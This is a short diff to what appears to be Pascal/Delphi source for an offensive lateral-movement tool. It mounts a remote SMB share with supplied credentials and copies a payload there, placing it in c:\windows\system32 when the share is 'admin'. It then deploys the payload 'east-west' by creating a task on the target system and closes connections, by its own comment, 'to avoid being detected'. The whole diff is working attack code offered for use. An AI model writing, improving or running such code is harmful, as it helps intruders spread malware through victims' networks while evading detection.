@@ -486,16 +486,20 @@ end;
   Connect(host,share,domain+username,password);
   if FConnected = true then
   writeln('[+] Access Granted');
-  writeln('[->] Deploying Payload east-west');
   writeln('[+] Checking permission (READ,WRITE) on Share ');
+
+  if ( share ='admin' ) OR ( share = 'ADMIN') then
+  filecopy(getcurrentdir+'\'+payload,'c:\windows\system32\'+payload)
+  else
   filecopy(getcurrentdir+'\'+payload,global_driver+'\'+payload);
 
   //stage 3 - start lateral movment attack here
+  writeln('[->] Deploying Payload east-west');
   eastwest(host,username,password,domain,share,host,payload); // that's will create a task on targeted system
 
 
   WNetCancelConnection(pchar(global_driver),true); // terminate mounted share
-   // close connection to avoid being detected
+  // close connection to avoid being detected
   writeln('[+] Closing Active Connections');
 
 
